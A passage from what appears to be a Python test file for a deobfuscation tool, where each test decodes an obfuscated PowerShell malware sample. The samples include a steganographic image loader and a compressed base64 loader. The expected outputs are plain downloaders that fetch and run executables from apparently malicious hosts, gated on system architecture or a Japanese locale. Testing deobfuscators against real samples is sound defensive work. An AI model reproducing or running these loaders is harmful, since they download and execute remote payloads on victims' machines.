            r'''LhZ(S@A|1mQye4T%f>Ke+|cFKIc*v*OpV{GL+&;XKkOdQ8wbq9lCmxy*#Hii|Gp+=k|+skGuIAhqE2#B2}qx~7bg`3F6N0HX)0#L'''
            r'''224#i4+!iY#Y7;F$+1bOs?C{^7N(Z(I{<_InS0C!vyTPOV9e(B8<!IH4Jq-%1ojiy^`0stXRQniQn8o!oKbSD_%yAE*@BK-1%B2i'''
            r'''l}F5Ee|fFH3YJRnQiCr9wEXKiD6L|KYoQ+NS_}Ois*M>3p*GxSadK}T3TtHrj+E109Y~LcogUk#bpzoov@c#MQupxXc`#L7i%5fS'''
            r'''$p^}uI$hMCuwEJ2reJ_d9J_+MxOl&SSHg5WdUYh+{E^z7Xcnh|nZ7*~1cgeV^YT%DV`Pv}Jn!GiMgn1=Wz)@b1(8TF9?PY|-AvCz'''
            r'''GWRD0#{dQoIhN<H%4o0#y8H0;zITEBu)W1<kwfyN8eY4Y-5D#I!Or67DrL1K-;grL{@jFxeA>eNn-=V(Zx2ep@U7R~lU%GHUhulw'''
            r'''+UJNTszUd%+G|_<eenE4)8$HD0DY`*f%LUSg*WtBFcm7d5ZMH-<p(Es5}q(0r3JFA;D7v3RpJ(@*DH-ONX<w4E9SzlAVa1+1-P$H'''
            r'''+O5^jU{&BOiBY0wPr3j7h11?vu~NJ3yn191gE*U>EZv$PDT1J6xHyGZkQO%XC-k4kY#S=+7$^Om>h>bk6OQ?xUoUXdVOUm+Un$P-'''
            r'''MO9gM`fs1K^2VUX;^&WrH_08B5lXV^hp9ma5zjQAlE|9ba_bD65=mhbJ{rQ!iVSm@UCrRC^_bPHFK-htHCP%@K?*D^S@$bUUqc>2'''
            r'''x{u^9Lw(a7=-t}LUoK1p064J|Xw~H^)HFW7ycMd+-mZupMrz(Be~s<hG9kN@Q#*q6x}`MXAm9enh72-Gv177-b7DRETCN~?@AON8'''
            r'''t3H*@LuVO7H52qhCW!S+1S0EWUEc&P=d%jK`51WhpgxdT+V}2O6<`7D?4^`-&f`o_Vt!uUm`c^a+c94yyed$q&;U=~H-AHMz*hd4'''
            r'''XGPvR#14<oDLWem^2V^Ki(ZFQq0H$#pZBVDbx8sAQUfds8nJhkU)EEEr$Q>+V5CoxZ^f35&3s?^w<;z|aJp0$#nz~!rkAV&Hn6Tn'''
            r'''9i1SRdo(fIcq~}^{5%und6Fmgo}_0zh&65)1U>RU1!cpfi`Im^c@s|(G{l!rAVT`k3A#OJ@=(B^W%m2Z=RUSZxo7*S+m|ipp<({2'''
            r'''>M9)J0iPli(S)bALG39v0DIFBt#I{tbN`!U+f0HpX9>P5puz{JH>{9n{t2Hrq(-EsMwJ<O9U?gmcX1@m`%lX~_AuKLd3yi-L?}`Q'''
            r'''JP}{tpk_eo6XReH?gf07m}Q}Mpg?(oUQ)!eC7Tv-X^>OSd{xxY5?X^nN5*|xCDi{fu@(fxMVqnuNiEJHeCig;|2(WPq2wjk)8`o}'''
            r'''3lLWb6~v9TIQ~w!Lbq(@IZstdk7%+mXR_Fa*g{nP-?xP3%-12@$O9Sv%71E-mc1J23+%&B5GmQGNn4Lx>&B^DGD+fxk@@WV7|s<M'''
            r'''do^hi^YHNxSS<48B)q*1Rii7$nC6g>_BSH{Q`S#gdi|s)00G!4v}XVSQhC8?vBYQl0ssI200dcD'''
        ))
        test = data | self.load() | str
        goal = inspect.cleandoc(
            r'''
            if ((Get-WmiObject Win32_OperatingSystem).OsArchitecture -Match 'ビ') {
              $zGK = "${env:AppData}\twaIn_32.exe"
              Pop-Location
              $4ai = (New-Object Net.WebClient)
              ($4ai).DownloadFile('[[URL]]', $ZGk)
              Start-Process $Zgk
            }
            '''
        ).replace('[[URL]]', 'https:''//paterdonga''.com/uploads/HelpPaneS')
        self.assertIn(goal, test)

    def test_real_world_stego_loader(self):
        data = (
            B'''$JUA=700;;;sal SSS00005 NeW-oBjEct;SAl a9999 ieX;$vum='0x5d';;$gi="box.com/fb/";a9999([sTrINg]::joIN'''
            B'''('' , ( '41>64L64L2d!54,79L70>65L20&2d_41&73>73s65X6dX62!6cL79,4eX61X6d>65_20_22!53s79&73,74&65s6d>2'''
            B'''e!44s72X61X77,69!6e!67,22,3b,61!39s39L39X39,28,53!53X53!30_30,30X30&35,20L53X59>53>74!65X6d_2e_49,6f'''
            B'''_2e&73&54>52>65!41>6d>52X65,41,64,65X72&28L28,53>53,53,30X30!30&30_35L20>20&49&4fX2eX63>6fs6d&50&52,'''
            B'''65,73L73,49&4fs4e>2e>64!65L66X4c>61X54,65!53_54!52_65s41>6dX28_5b_49>4f&2eL6d,45,4dL6fX72_59X53>74L7'''
            B'''2!45X61,4ds5d,5b>43L4f,6e>56X65L72X54_5ds3aX3a_66!72!6f,4dL62>41_73!45>36X34!53_54!52&49!4eL67_28!27'''
            B''',56,56_5aX68&69_2b>55_30_46s50_30>72s52X55_62_65!44_46&73>6c!4e,38_6c>4es55>2b>6b,58s46L54!55_4cL51X'''
            B'''73&52s64&61!47,46&5a>5aX41&53!46_67_72X70&30>52!76_64>4cX37X58&2f_33!6eL4a!75_73>71!38X50!72s39s4c_5'''
            B'''6>4a&62X75s34>39&35,39_79_54>39_7a>6a&6a,62X37,67!66X50L68_6e!75s37s6fL64L58_2b,33s42&37>2f_2b&57_50'''
            B'''!4c,78s39!2fL2f_75&32s58,4c>39!37,39!2b_6e>77!62>62,72>66!68,41>57>4d>76,68X6as65&76_58s6aX2b&39_2f&'''
            B'''4fL4f>37s74&2f_63>33X38X62L4b&47s76&50,6cX55>67!6cL2fX6es74L49,6a_6f,4bs44s4as64!34>76X30&6f,45>5a>2'''
            B'''bX44s2f>39s32L38>32!2bL58,39,4b!5a!49X58&33_44L38,38,58_33&67!2b>63L46_2fX77L58&4d!58!46X69!75s2b&62'''
            B'''&43L41X4a_35_78!58L30&36!78!55,39&4cs77&42_51s33_63>34_65X51>56X78>45,35L67X32s2f_76&38&68&62X38,46&'''
            B'''6a>4b>43,75_6a_31_34>72>4a!30&4f&45>62L38,71X51!2bL74L71_59,57s4dX4e&71,63&52&55&6fL79X79_61X6d&42!5'''
            B'''a,6dL42!41X36>4es30>53,2f,71X64,35,56&56_4d>37,4c!51>47,75L52,51!4a>47,30>35&68_6f_33X33X79_4e!31!30'''
            B'''s38_62&72&48,61X55X75L75!57X4e>35,74s39>52s55>46s77s33!74X79s52L39X52_71>78&55s70s69>76X76X33_43s35X'''
            B'''6a!49s64L74!6cL76!63!2b>57X6d!56L6e_77>32_57!43L39!57!63_75s4a,5a>2bs72&66L38,5aL58X6a,6f>49s46>51_4'''
            B'''6L58,71&30,4bL6ds74&59>45,41_63_41_56!6cX37&69L45>44!76&54X77!61s48X4d>42L57&41!63X4a_68s77>42!43,45'''
            B'''s77X39&37X4e!67>41&69_62>54&73L51>42s6b!58_33s52&47_62>55&72L4ds79_70!52X72_6cX34!49s69X64!67X30>48,'''
            B'''53L6cs77!41_41s48X43,61s42s6e!4d,67>47,71&4e&73X6c&6f>64L72L6e&48!5aL78_6f>72,36L55>78L4e_41X59L36!7'''
            B'''1_6c,68_78X69&44X75_36!49s56_67&54,66&70!61s4a>63L6cX66>6cs72>59>76_45!51&74&41_46>39>6c&6f>7aL71s34'''
            B'''&67_32s54L65X64>30X31_4c,63s6a&32X62s62X48L77X70,69_32>55,71L52s42L50,51,4fs2b,78>31&78s58>43L71!32!'''
            B'''7a>52_57s54s52>54!58!59L68_6a!37!36&53_49>6b!62!74_35,4d>44&52&42X50&72s67&62>4a&31>6d,41!61L2b>55!3'''
            B'''7!63L31X6e&53>42X44&5a!43s35!36,59X4c>55!56s67,33>2f,5a>31_72L32X6as67_6e_76,43>38s51>53,39>59_79,70'''
            B'''>69X41!75_64s44&4b_73X55L64!63&57L46L6c&77!4c&47,58&4a,4d&62>4e!61s4fL49X47!71s45_73L79X42s49L5a!51!'''
            B'''30L4aL58s7a>45X56&4eX31,4fs51_51s6b,45L42&65!58X70&44_4f,69s69&35,4a!73L6eX6b&33!42_69s74X34,2fs36s6'''
            B'''8>76!7a_48!4bs4cL35>58L77,31!61!70!64>57!57X79L4d_55!6fs34X4a!52,68,4aL78L4bL4a_33!54_55_47X59L39s71'''
            B'''&6b,67L78X70!30!56>69>67,30,4c&43s48&75!57s4c>49&49_62,4a>65,50,65,2f,4es65&48&47s41s57&65,49s5a_2fL'''
            B'''59>56_55_45X4fX37>71&2f!42>6bX59_55s63s6dX6f&47>67,4eX41L4cs7a_44X71>69,75&49L61>4aX4d>51L38>6e&64s6'''
            B'''1!54L44>6d,75,73&34X61>75>36,46L55_6eX4fX36>59X50>57,71&38!32L4e>42>66,31_47,69,4ds41L4b>72_72s46L42'''
            B'''>6c_6c>73>71&66>4es65>65>6dX39s34L35L37_75&4c!56&39L4aX42&32s6b,36&65!77_51&42s4aL4c!66!36>67&47L43X'''
            B'''42>53X59!4c!32,74&7a!77L6f_42>76s37,41_59_55_34L79s2b,6c!35>74L52>34&43X62s49!32!4d&32!6dX61X44_6ds6'''
            B'''d,4d&30!68_6d!77X61_6bL36s71>66_48s50,48>76L35s33,4b_64>62&51s70!77,54X51_48X76s54,71X79_52>30s69!6c'''
            B'''>6fL6fs46!38_57X4as4f!4d!49_43,77X62>37_43_7as66L4dX54s72X45s79&59X34!56,57&70_4eL79X4d_59L42!4e!31_'''
            B'''51!4b>67!67X6b>42>4e_68>61,4f_6a>67_56!69X75X74s31L56L43L54!49,67!50s78_4a&78s78_67&6f_68>50s65!45L6'''
            B'''d_43>2bs6bs4es58_4d>73L57_78!4b&2f&79s4e_72!6e>65>71,50L31X53&71s51s55s46>72L61,4a&75,56L42>6fs30L63'''
            B'''X4e_4e_74s77_51_6bL59,5a>72L55!4e,4cs42,42>4b>30!67s37_4fX31&54s43>4f_4bL2bX46_6b!6cL47>39X72L57&65>'''
            B'''45,4as47>51L75!50s77X79_49s57_6b&61!74&73_41!36_66>6c&30_64_46!70s49&31L36s68_77&53_2bs79L4fX6a,76!4'''
            B'''d>6c,54!42>31X44&73X2b,77>56X33_52!72>6eL33_67L62L6dL39,4c>74L48&56>38!70,71_37!51X6b!4aX59X73>4c,5a'''
            B'''&62!49_38>46L48&51s45,38!47&69X57L73s45L50!51!64s61!45L35,44L41_2b>6e_36L6e_68>38L67!51_54,34>31_73X'''
            B'''54L52L6bs66>66L6d_32,42L4f_35L6f,53_31X59s66s39!69_52L4c&50,71,33L55!4cX69&55!4f&6e!48_72_67s32X5aL5'''
            B'''5s35s73!59_6d>77!48,6c&61>64>48s50,6fX57_6fs47>36!51_76L77,4d_56>4c&6es77X51!35&75!62s74s51_4f!4aL5a'''
            B'''X55_36X79!39!59L58L43L75&77&46X4c!69!74,48,7as55X4f,4eL31&6dX56,48&52&2bs75>42L52&66_30L4f,52L73X33!'''
            B'''71_6b,62s4d,45s73X43s6d>6f!56L32X49&68_51&64L64X71&58!59&37,4ds53&35X45L67,54L6as71_75>49!45L6dX55&5'''
            B'''9,6aL77L38,58L75_59L54!4d&62!47>73L30>77!64X56&2f!30!5a!77s6f_62,64&6f,39,32&56X42s79&4e,30,73&4e,6f'''
            B'''>75L6fs78!6eX35s4b&71_5a&6cs6b_57X52X55,75_64X4c_41X74L2f&4f_4fs74&54!61!76s37L41>68!73X4ds48&59s57X'''
            B'''45X69L77>2bX73!72,46,7a!6e_68_6cs75!6e_62&63X4aX49s64>64,33,64,4a>61!6ds67X47_42&50L56_33_41L51_5as5'''
            B'''8L4fL37_56&32s5aX39,4eX4d!64s65&55&62!30>44_41,77!50X43>42L62>53s6e&4f,6e_67>35&77!78X47!74X7a>44L68'''
            B'''s37!43s78_55>6a_49>2bL73L4dX4b>48&78L51s44_75!79X78,42>66&4d_7a_73_57>74,5a,70s4f,75X77L5aX45X76X74L'''
            B'''4d>36_38L30,5a&2b&63s38>41X32,68>35!56s6d>30&59_61_71L50!61,45L78&51>43s73!63X73s63_2b,57>70>69X71!7'''
            B'''2X67X42_58_50X78L31L49s42>68&55X68_73L6dX56s58>69,36s37_34_6d!48>5a>54L39L50X31s4d!77_52s32&51L4dL43'''
            B'''_6dX67s57,4as70_70,70&63>64,59X73&64&6c!35_4aL75>6eL7aL2fX2f&38L50L33!2b&2b,6e&36>34s31s65X4fs38_31&'''
            B'''72,48X73&32!33!4a!37L2bX48>76>34!39>42,7a>65!66X46_30&65>6eL39&34X4fL39!33_63s2fL44L5as39s39&74_64L5'''
            B'''7&6e_34,65&37_39!58,37L38s50!44,39&66!77>38>4ds4aL2b>37_7a!78&2f_38,2b>64>77!65&2f,66L74,4bL2f!7a!4f'''
            B'''s47s57,37,38X6e!66&50L77X44X77X3dL3dL27,20>29>20_2cs20X5b&73&59_53L74X45,4d_2e&49L6f,2es43s4fs4d,50X'''
            B'''52s45>53L53,49_4f&6e>2e,43L4f,6d!70X52L45s53&53&49>6fL6e!6d&6fX64s45_5d,3aL3a>64,45&63_6f,4ds50X52_4'''
            B'''5,53L73L29_29!20_2c&5b_54!65X58&74!2eX45,4es63X4f_44L49X4e_47s5d&3aL3a&61!53&43>49s69X29s20L29s2e_52'''
            B'''L65_61>44,74s4f_45s4e_44!28s29'.Split('X,L>&!_s') |% {([ChAr] ([CONVERT]::toiNT16( ($_.tOstRING()) ,'''
            B'''16 ) )) } )))'''
        )
        test = data | self.load() | str
        goal = inspect.cleandoc(
            '''
            $G = New-Object 'System.Drawing.Bitmap' ((New-Object 'Net.WebClient').OpenRead('[[URL]]'))
            $o = New-Object 'Byte[]' 194600
            (0..277) | & % {
              foreach ($X in (0..699)) {
                $P = $G.GetPixel($x, $_)
                $o[$_ * 700 + $X] = ([Math]::Floor(($P.b -BAnd 15) * 16) -BOr ($P.g -BAnd 15))
              }
            }
            Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($O[0..194379]))
            '''
        ).replace('[[URL]]', 'https''://images2.imgbox''.com/fb/a9/wH2ykZbz_o.png')
        self.assertIn(goal, test)

    def test_obfuscated_loader(self):
        data = (
            B'''. ( $pshomE[21]+$psHome[30]+'X')("ls pena*;sal Hi sal;;Hi Yi nEW-objecT;Hi Ji Ie'''
            B'''X;;(Yi IO.coMPREssioN.DeFLatesTream([io.MemorYsTreAM] [CONvert]::FROmbASe64sTRIN'''
            B'''G( 'VZpNz+zGcYX/ygvBwb0XTgx+DJsBwQW1iBvOIm7E2hlCEAaBKcCQAl5BC9L576nznOJYAWTr1cyw'''
            B'''2V0fp06d6m8+fvP54+sfPj4+/fLt+cN/7n/97+Wn33/9FP/96ePLxzcfv/3z15/PH378y/efP03T2U9D'''
            B'''/G9e+qk/+760qauvrr3mo/RXiY/G7i7jUrqtH6a1DHd5tb4faum3uYsH4rO5llim6+/S1/jXVuarxHrz'''
            B'''uJf5LtMRP9pKV+ODg6/uvhti6WvuWqwZ76mltHiwlmGb+7svZZ3jpWXL95QSyw5bGVoZ9W2du6VMS/wV'''
            B'''P9/KuMfKp3YWf019i9/NnT6L3R5lrPG7I14VP42NND3UrXGqpcQmxi3eG09sZdrjs+vZy7DHO+Z+Z6dh'''
            B'''itcVf51x4DJdHGdY9bt+2rFS83pxgIZFhrO84pT9wSnjifh5rBLP6nexuWE6MYWWDaOsXjYe1BtbmZu+'''
            B'''Gjv9q0ybTlD6I/51l3mTbXWQPqy0eQtsRt8O9xwu48CXzNZP8dke/otl69yHEbRK7GnTsjqwflrjr4Nn'''
            B'''W5htwZRr7DHOI0/EX7dMNF56lsf12Ykb1r6Msewa/x/HbDJCmJwnqn7X5Wexq3BSv8uL2HXLJSPs9Nmk'''
            B'''0FlkzSJrxqGOiDkZJPYWHotDxgoRC0tsOd4UDjrk0niT9tFfPteJCzhrrB+Lr3o2nJuuih3JzhEbsYlc'''
            B'''hdBeIkT0RHxWYh9F315lWMprIQjGu3CaqqB6bfw1XgprfRUH0O/iBeH6Mb0S/4RlLkVYBGTYSK/BGNrs'''
            B'''TtRVzh+bLTKQEi5e4zAgzHuFeXxbtaNIkTihUiSCG5uEN/XXoSd0Btl3UVIpgSIpSa+1RAiWSD5laITP'''
            B'''QWTGMUoYI/ZbYnsKC/JlqoTFeNpUh87QbbgxFpeNnDw9y0WYTD1ZEyZ6Ve86rNLiYz0qF/b6jyqjxn/P'''
            B'''tqEWrbjZdh2UUrHCYQvHX6cTE1trN+ExIIREf+1KfhJY3tlkqbkRxXooDL/5jItsjSObM/yQhQsoov3H'''
            B'''BobD+XIK7JSXJb0fq1ZBQGxR1uQvfRYuxsK8yc69lL8sWUuXjmw6cRxX4Ckj77b1LfQJb+sYUyMPxiaD'''
            B'''6Wi9YjmsvggtYqFAzFmp0HzIQ7+LjekMstHGQk4UpX3YUi4Wfhg6F2WgrBzLkVYKzicaZNsjXmEoX9ie'''
            B'''oFzhwTv1o4CmWVFyg0Q1a0CsVMscy+7A/pzwuRYqwsJXt5IvrCYs7iflpaFJZSNS1egYppYDjd5aXfjM'''
            B'''Zwqp1e5twNBpQFImUpP0gwo4juR95nimV5wq8Kyr/uwUOkV2zvHCUb/DrGR7A8W0CtE2ugxE4IQdRpyt'''
            B'''b5W48WyccF4BN+FtmFKfRdZVUkJ+PAH0XvGkqI9cVSiP3YYftbjSCSgJq4cJAhgjPgEpbWIlBqrPusji'''
            B'''8reSxA4Km7yUBhvuk3WWrMlYbNGhtAMB10kQGMzDIIofqspKNXRZlml2AkMHrQ7dwOAVqFfGC9xkCeFj'''
            B'''fxFNRf+4TDcXbGpBL8cYg2XZW8cbZC77ZzXAE39EXdWbss7FLssOlhQhMSEo9944UMm/vOvp4ZCOzxSq'''
            B'''C5a9zAaooE5dwQURGOlxGYR20uNS2CrR+1PIhuc28xuDy+aySdUHcFYBThdJN2otoE3fVsqwolSADLbG'''
            B'''klTYJcMT9F8pwc1/rYLlSYYQ0jiIlOsR2c/GA7xEXgrEB3ReveqND4AUqpU41s2hZSZQavIxtOThxasK'''
            B'''AIm6KnvCs/N4sWozDlWljvYvK99EnuK3GfOrrAetaVCdTTlJPFf7ZFUSxCKv0xYWvzEj2vOBuRJgCmx/'''
            B'''HHhRNgqfysxmMkDAKrTk0YtaKl7U4JG943s+hSsKnkAY0AiHyDWCHDvOqAecwoEUdSKWOviiRCu333iY'''
            B'''5ahGCzOED0IFDASm7xhDlGez+aoJiwieYNwry/3agYr/5hxqSbDgNsSHUDGsz3EoXBNYSIkUg+a81CUq'''
            B'''VKSRSFLYc7xKsigKDQASP31pyYsqvMFxx5PCWwmdd/LgqMvscs+qm7UW/neyvi0oqPaWC4CiXBZkNrOo'''
            B'''Q+6OzQeKi3yntVRLyuLQV+bIdMRzBDNFdWpmEeDntBB8KrwqWhBGrQ0VAz8vwQWZuZjG4SQo4O4iC0fs'''
            B'''Dr8ZYt+piu3sRgklpmW0wTjx/6SR1prpZxZCBOqkgodz67swOt8vdi3sXMDJnizRE0JMOeQGn086DrU5'''
            B'''b6wgMCIaF5/9AZ3eVFfUvjrdGj8dFo4L/8ezlYKovNpEJYs4AJbhpwdBdpqxbnqF/KkKnkz0FiJ3Mn7V'''
            B'''cWex80MZDD9u8mdEzgxr05YpPYtrXVVJof4pMJ5KWBYAS8a+wRRlzuEGS80eLhsoZYDWqUwkyqrMB1w2'''
            B'''RaNO7d4Q4Kw4VJa47fgjLQFusYnixkX8ZvFmLwObzgGmDtB/dQ+D/WrA0OIrzWj8x6/MvMDHeoAe65xZ'''
            B'''ovU7xaVODNHroRQBSFqfvILUmSPABDfbza1sNec4xakGJ/vLVvVr6fMWe+5WM9PrA33mlnl9OtCOJNJv'''
            B'''Z7eLDwGXQbJDU0CU5i5r1xuFqrL2ZixsqiHiYy7v+OIW8VcvoT1Wt+CbyeiqJyCji+F4AWlNE7Xpp76x'''
            B'''5sxKJIUbhxGgL7v3syjqlLqRo+Uy3DVHkxqMoGDUiQESGHRSeUtxdFwl4UuLbpTOFacVkhbbNtN6Tj81'''
            B'''c7dqvN4hi672St/DeA2nl12N4Z13oDMrFlilH8AxdfaH8XQzCVwgrZXWWHC5u2cTMGvnk8zQ5FnInaqA'''
            B'''a7BcrygEsg/H1ULbqmQ/KdfVBeh22FRXe5sATBHOCApueOBwmadcII5TKzw6n67DLbOQWNv8Mf3AuPqc'''
            B'''h1nGnXHK4gtJEWVHMZAFXSfciAGrPjPsFJRcDXibKIXaKX3lWtRlJDdxZCH7nAkiLuUWgsihGVydio3W'''
            B'''d3OLdkNKB5JcDYKKw62/ZHVF8uEeV9ICJ7PWoNIxrM6xhXi53BeJfombg9WrfgrPpZfoDKSjEV/M6jLI'''
            B'''nehEIkqLuFIElAJ5chVQP2mzCV9XQ+CuFItX/wqHLKqgRe3AcX8kF0IvuXhNMz04nKEX1LBa9BGIPjk9'''
            B'''CM1XFIbD7VdTngvXxWW0iaq+Zri93mWb1CxPvHrVerxjV/BJM1GZ3xxyp992ybKTg7vA56git4FpQ4NI'''
            B'''ZnqYKcjT6D6Qaa8CIc6mbl79RIU4u+l226JUUtrcRp/DiWZGPyzZWsoLczIlsUwUATWkJzwvwnNKZ9wG'''
            B'''psvhtRFe9a0oHiZ00OkpwyZDBOYqFU4qI656knAnpgcVSpOHVYFB33zpzFYi3q/ZkSYVSpJtqGXyrKWP'''
            B'''gfBCWbssSF78Y2hQna5mVrtso+rcIZMiEvEE7LMJEODYu54F4XbFkRyi/d28V2V+R2wtqQGucEAwgGbp'''
            B'''XeCy5VamUEMAJ5CQ2Nof2vpan2rSrbxjvrLjn1PiGlxUm7uDBTdVB9+hIDBEC/yt/SI1OXZVQBfbTjTT'''
            B'''BV+kwLxzd5MGwSz1qXnS2CKTpW3RWClJ+0QAyXsUrCejasqoEzKl1SlE35dbsYGmRq2krHg+GqCVSkrK'''
            B'''ZeJ/g8qbNZjtYY7i66hC2Fek08C8vzU7pGRq4kn/VgAVPaEAk9Lh/u20TdxFuSCojdncKkA0+jMdQA9j'''
            B'''DYXCDryUxZi0mIHfb+xCon3drugVown8UZSEiuUwFaCbppQdc58ysDBYpnqC+vy7GuhW/S7ucyjoBEL0'''
            B'''ElDtM3nca8V67g8l3Y9w3QHehaZ5PirC8y0NNvF8uNdqnHa3TAfJL3RTc7cZiw1gm1WEmhClhSaTswKl'''
            B'''6pF69cTUQ/4ma1ElBTUpz1YhrVtl9I3vjhqB7+CDE0ibDpZ/FMqG0W8ia96sgBAXcPWaouRssRdV25XZ'''
            B'''2D/QRnWWMYXk8azcbo00Jcv7PfE4HfKb5yHYh9J5/r3epEJZsoc/PU6p6RZ0wtPlakuRT3sbk/1tlmzB'''
            B'''ZCQ2ExmhNh23dj8janTDbpkF1JYEKSWwOppIFp5SW8/2PRCZiCMMI8p70lTrKUPsvHobrcymO85kJaCI'''
            B'''Xy7YYBlzNdta1b3y1Wa5YKXW7JYNj3cZ2FB3FXXV7PV4l4bFoaraQfuCOklfsbqF3hM+XFTNCqSkZytB'''
            B'''Ul9WAFeLMvt7GgXHnHU+j0ZWN9Ob5TUVBDmG320u5m76/A6hiLsHSSapJ2xSqDwKmtGN918Rs/7CBrOJ'''
            B'''olq221zZDWhPAZ73bM0tMrhvvk2zVhcZpNKyuIGxiq4oXIz5K43fZQ3zlE9F2sXwVtO7pAoX3OkwqUuL'''
            B'''7GRf6pCovjhjc+cBqZlN0GURBy36zqNgQUvJCKnVFjg8hqGQ1fcIa3vUxvm23sfgRopHn6OuK8dxnG1/'''
            B'''y04WBGZ6ZfNmsE5JYB1wPvxVFU7Q6d+KWQs6rmE1iwZLb+9ZXH0GnOLCt3sTujpaVSkfVtkTVd4yrMOb'''
            B'''yKdH0yk614W5PUlhzeehQqp3TNMeVt0UunBdukxE1MU9lblphu79hJU0Ao8ytLJKC/aZEjrTKpXqb8qf'''
            B'''OdlZNElbigSs7vVvRgOLdeJmVtrgrMljKTlyliC3moM1KxAwtM544DmnkkoiBKqE0nBa38rK5RM4hKZH'''
            B'''I4NbYVvY9eVd7akPKoW73RIpsh5905WdtTDPtnkaiuaJ5DnDaVaGd+3dtVoHGIginTIen88nxBNiImBe'''
            B'''7hIkkjenFuNrcTpB0dNLOx42EioDGwCCtW1v2f80ZF08m6PqwyrMgdVOT1Y9Tx48IrfMqmTc7KNU/dz6'''
            B'''7FY7UrNdc/fqB63l8O1mDsfJ8TnvtVoqrsuIRDTYowr6GVGZ8U5Q6fzsZErpHu+BY2sexcmYkrpbsT7n'''
            B'''1qlk3V79fgBooNTP2Y2sht+nD2Df2S8fzEKWbD6YKq6YNgfWq315mBou2bAz7jucc3tmEIG7srGnD8jM'''
            B'''OjIG9ZSSZn3qEdJTy3ku7ejqlujg28bu5zNtk1KFSsHMCAS/a9wFGJbb1th4x2FMYl5Dd+LZ9cBwImu7'''
            B'''srwmYqXqzNs8Padq1LzAMKXWubqpW4BkiwBg9OFrHswkNFYaiaA+50LVHeyZkQaHIChpQ/aHb1JOnWY7'''
            B'''Pz0cOpdrIVK0B3ZcRch+Y/WzO63w6sqU9zu4iqD7BdcjndMB3TIN5aIysl+sMa8eKN+y80BupqbKRZH9'''
            B'''GdNpWOK+WMP2y93NbubB/GzI6F6NSnuq78pmqe+n29i90L/tzIIO+7eZh+4oVPszKC+08xM6HuyMkRNj'''
            B'''T1oWt2v/LwmaOMPkAQHjX4+SDY3jaiGWtHuZeXgeSS++Q72my6esRJO1XAWAL8v0Zvoz9wyQL2tesEC+'''
            B'''rHY7mUug3ZZTmXrQRII7apCuX43wIT47I6txT/SHyO+eY+w52U3rjh5oDc16KxMH5t8eaCnStTjt2MaS'''
            B'''oiB5DeQw21kY+ouxVIb+F9dFeoeMkrTZiVdesFCioWe5faYJJzyqR0o1RXAB2NhKjloewZuC16FspdDc'''
            B'''V0dv0y4NZoz6FvOl5pbAFzFO++HMSX5SaOqnZ2x5m6K5EWs4xYq7tZcZxd2SjhmN5ZuUfjqzkocmVp7P'''
            B'''2zBcbKFKSkqyilq5WjI9V3y4Z7NYtVvBqpN8Cb5Ssg5ebwpHM9eb/rnLLyl+IBw/KptLyNjeM9jVxQmv'''
            B'''0Ga9mcd8+37ZjSn2Rwql+V8zmDrf14AEtCwBKRcrsHsUjWl95IIuozzb1Z1WDkTlQhx9C8OHd4PNzg08'''
            B'''nnbnZIe1WGEv1lejz0Ob2cHknsZ/vt9i7e5Cr6tvWjhhSoa1xsw9tebP6G+fsbyv4g0olsy47Uab3Y0f'''
            B'''FM4qku+ZZUBMDOMUBjS1OWo9cuzE7Y7LkA7McdelZffiPTqSWnZSdC/ZBTwtbza/yGgUgX51z3gr6SYH'''
            B'''u1st5hm7NZAzb1yl9mlNjXhyKynod7c9JEleH3ram9V4GqwrjpfLewLoohHT6zJQaGJpZebMGTij99NE'''
            B'''hFNPVs37w+OaMwd1xN3hGz7HM9kUBh5Wmvdn6LAbOPbS+QpWFqjq7vCw9W9FvbR4NWWLtZCaoyiG37eH'''
            B'''H09PCMXgzohYsWdh2R+9fKNEPvS4bq5Pp/pMhS63SRWUOO3U00KBenK35revDG3WvSq131qbwvV8Xylp'''
            B'''72tAeX+P2k+JuayUXc+VHyXjxunbc1NufH4wU9NahkKO6inFlpSYvoISlmXcFpDpNcesuR6SG4VfWVHy'''
            B'''nqmzJ2fOOfTa8t6Ru1ff46y0a7tZj7UWtPOcXgDuu0fPNyiZ1z6YfQ8eZTy0g2nmkHLXzXxocIVxXe6Z'''
            B'''pc7HG5Ju39g8XSVdri+me+P5II7vztEzZEWUNmD1xfLd6ct865uWI/HCo7hawC2t27N7q9/t6cN7UJ6u'''
            B'''+EpRVNE1Uqpop6u7iVvxYO4Cj6rWPH3XUqG7lsT7vMd2P+PfHpEEqVF339zVHM5X4kOaqu5y5kjuysE9'''
            B'''ndPxXCUQuCxvDeh6LvROnmRAgfe3lLWDgx64dO4kPLPCYqs7ZEdzTsxXEzDr5ZZhTTupiLdvzlgOqs8Y'''
            B'''gqnj9Z78VKCwuW+53LU1XwLJoQ6Xq06PXhhk+lqH5audKPK9BpGl8xmvohdZVMgRjaIPJVq3j8+sAOnH'''
            B'''h6Hb4kNeXGWo2J2+VUWb0fs+NTHnWRfZgtZMvCJTWrLZCOO+WcvwhYnjNV9T4cJKj1LyEpUPO7y2qVte'''
            B'''qptADGmhEqadCS96d+2oFeIr8dNXVyfR7Nf5ov2IuI8wfqk5iCh8SVOORBuna+r2V/yjSy1z1VOx5Eus'''
            B'''TECv22BxZHW8nfPnmnTbYNom3Rniurt8/Ol3X//nrz989/nTeW13Xdqxr5++/O0f7s8ff/6vn/7tl385'''
            B'''v/t+WX7+4x9+/Lkvnz8+/+Y/fvfdH7/+/O8//PiXz18+vnz848c/f3z5p2+/xq+Pb8/vv3z8b3z4229+'''
            B'''8/lPv3x8+un3f9L9/I9PX77527/+8H8=') " +([CHaR]44).ToSTRinG() + "[SysteM.Io.cOmprE'''
            B'''SsiON.coMpReSsioNmOdE]::dECOMPREss) |%{Yi  SYsTEM.io.StREAMreAdER( `$_ " +([CHaR'''
            B''']44).ToSTRinG() + " [TexT.enCoDiNG]::asCII )}|%{ `$_.rEAdtOenD( )} )|Ji" )'''
        )
        test = data | self.load() | str
        goal = inspect.cleandoc(
            r'''
            $hb = (New-Object Net.WebClient)
            $sK = Get-Culture | Format-List -Property * | Out-String -Stream
            if ($SK -Match 'ja') {
              $G7E = "${env:Temp}\NGLClient_Photoshop120.0.5.exe"
              $Cf = '[[URL]]'
            } else {
              exit
            }
            $hb.DownloadFile(($Cf), $G7E)
            . ($G7E)
            '''
        ).replace('[[URL]]', 'https:''//firedron''.top/uploads/IMG0065.jpg')
        self.assertIn(goal, test)

    def test_real_world_05(self):
        data = (
            B"&( $enV:coMsPEC[4,24,25]-JOin'') ( (('((mB9r5PnmB9+mB9smB9+mB9amB9+mB9dasd = mB9+mB9&mB9+mB9(FzmB9+m"
